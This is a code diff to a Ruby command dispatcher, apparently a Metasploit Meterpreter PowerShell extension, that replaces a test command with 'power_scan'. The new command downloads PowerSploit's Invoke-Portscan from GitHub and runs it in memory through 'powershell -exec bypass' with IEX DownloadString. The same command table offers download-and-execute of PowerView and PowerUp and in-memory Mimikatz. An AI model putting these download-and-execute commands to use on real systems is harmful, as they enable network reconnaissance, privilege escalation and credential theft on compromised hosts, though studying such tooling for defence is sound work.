@@ -22,11 +22,11 @@ class Console::CommandDispatcher::Priv::PowerShell
   #
   def commands
     {
-      "power_shell"   => "Execute a powershell command.",
-      "power_view"    => "Download and execute Veil's PowerView Framework",
-      "power_up"      => "Download and execute the PowerUp Framework",
-      "power_katz"    => "Invoke-Mimikatz into memory using PowerShell",
-      "power_sysinfo" => "Test Command"
+      "power_shell" => "Execute a powershell command.",
+      "power_view"  => "Download and execute Veil's PowerView Framework",
+      "power_up"    => "Download and execute the PowerUp Framework",
+      "power_katz"  => "Invoke-Mimikatz into memory using PowerShell",
+      "power_scan"  => "Use a Powershell to run port scans."
     }
   end
 
@@ -165,6 +165,17 @@ Ref: https://github.com/HarmJ0y/PowerUp
 
 > power_up Get-ServiceDetails
   => returns detailed information about a service
+}
+
+ POWER_SCAN_USAGE = %q{
+Powershell Portscan from Memory
+===============================
+Desc: This is a loose implementation of nmap using powershell.
+Ref: https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1
+
+== Commands ==
+> power_scan -hosts (Comma seperated) -ports -PingOnly -Threads -oN file
+  => Performs a basic scan and outputs to file
 }
 
   @@command_opts = Rex::Parser::Arguments.new(
@@ -331,17 +342,17 @@ Ref: https://github.com/HarmJ0y/PowerUp
     return true            
   end
 
-  def cmd_power_sysinfo(*args)
-    link = 'https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1'
-    output_file, c_time, ps_cmd = ps_setup(args) do
-      print_line(POWER_KATZ_USAGE)
+  def cmd_power_scan(*args)
+    link = 'https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1'
+    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+      print_line(POWER_SCAN_USAGE)
       print_line("-" * 60)
-      print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
-            "Downloads and executes Mimikatz in memory through Powershell.\n" +
+      print("Usage: power_scan -Hosts/-HostsFile -Ports/-PortsFile/-topPorts -threads -oA file \n" +
+            "A nmap style implementation in powershell.\n" +
             @@command_opts.usage)
       return true
     end
-    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\""
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Portscan #{ps_cmd}\""
     ps_exec(command, c_time, output_file)
     return true            
   end
